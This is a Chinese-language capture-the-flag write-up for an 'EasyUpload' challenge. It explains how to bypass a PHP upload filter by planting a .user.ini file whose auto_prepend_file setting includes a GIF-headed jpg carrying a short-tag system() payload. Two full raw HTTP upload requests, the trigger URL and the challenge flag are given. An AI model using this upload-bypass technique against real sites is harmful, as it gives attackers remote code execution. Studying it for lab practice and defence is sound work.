# EasyUpload

## 分析

> 文件上传绕过,本题的主要考点为利用fastcgi的.user.ini特性进行任意命令执行

> 这里需要绕过的点如下:
    检查文件内容是否有php字符串
    检查后缀中是否有htaccess或ph
    检查文件头部信息
    文件MIME类型

> 第一点使用短标签绕过.<?php phpinfo();?>可用<?=phpinfo();?>代替

> 第二点可以通过上传.user.ini以及正常jpg文件来进行getshell

> 第三点绕过方式即在文件头部添加一个图片的文件头,比如GIF89a

> 第四点绕过方法即修改上传时的Content-Type为Content-Type: image/jpg


## .user.ini

> fastcgi运行的php都可以用这个方法来getshell,php.ini是php默认的配置文件,其中包括了很多php的配置,这些配置中,又分为几种:PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER,其中模式为PHP_INI_USER的配置项,可以在ini_set()函数中设置、注册表中设置,或者在.user.ini中设置

> 除了主php.ini之外,PHP还会在每个目录下扫描INI文件,从被执行的 PHP文件所在目录开始一直上升到web根目录($_SERVER['DOCUMENT_ROOT']所指定).如果被执行的PHP文件在web根目录之外,则只扫描该目录.在.user.ini风格的INI文件中只有具有PHP_INI_PERDIR 和PHP_INI_USER模式的INI设置可被识别.

> .user.ini实际上就是一个可以由用户"自定义"的php.ini,能够自定义的设置是模式为"PHP_INI_PERDIR 、PHP_INI_ALL、PHP_INI_USER"的设置.和php.ini不同的是, .user.ini是一个能被动态加载的ini文件.修改.user.ini后,不需要重启服务器中间件,只需要等待user_ini.cache_ttl所设置的时间（默认为300秒）,即可被重新加载.

> php配置项中有个配置项是auto_prepend_file.它的作用是指定一个文件,自动包含在要执行的文件前,类似于在文件前调用了require()函数.而auto_append_file类似,只是在文件后面包含. 使用方法很简单,直接写在.user.ini中：auto_prepend_file=01.gif

> 所以我们要先上传一个.user.ini文件,Content-Type为image/jpg,文件内容开头是GIF89a,剩余内容是auto_prepend_file=a.jpg

> 再上传一个a.jpg文件,Content-Type为image/jpg,文件内容开头是GIF89a,剩余内容是<?=system('cat /flag');?>

> 然后再访问目录下的一个php文件,访问之前会加载.user.ini文件然后去访问a.jpg文件,执行里面的代码获取flag.

> 注意到,上传文件的目录下即upload目录下必须得有php文件才能触发.看到题目html源码,发现提示存在uploads/index.php文件,说明此题正是要通过.user.ini来绕过.

## payload

```
POST /index.php HTTP/1.1
Host: 61.147.171.105:64926
Content-Length: 336
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:64926
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6fLmAwvYAQTAYKuL
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:64926/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundary6fLmAwvYAQTAYKuL
Content-Disposition: form-data; name="fileUpload"; filename=".user.ini"
Content-Type: image/jpg

GIF89a                  
auto_prepend_file=a.jpg
------WebKitFormBoundary6fLmAwvYAQTAYKuL
Content-Disposition: form-data; name="upload"

提交
------WebKitFormBoundary6fLmAwvYAQTAYKuL--


POST /index.php HTTP/1.1
Host: 61.147.171.105:64926
Content-Length: 318
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:64926
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycOwSi07Hr42YMY6O
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:64926/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarycOwSi07Hr42YMY6O
Content-Disposition: form-data; name="fileUpload"; filename="a.jpg"
Content-Type: image/jpg

GIF89a
<?=system('cat /flag');?>

------WebKitFormBoundarycOwSi07Hr42YMY6O
Content-Disposition: form-data; name="upload"

提交
------WebKitFormBoundarycOwSi07Hr42YMY6O--
```

> http://61.147.171.105:64926/uploads/index.php

## flag

> cyberpeace{320fbd1728b7f8c6a99b6e8f969128e1}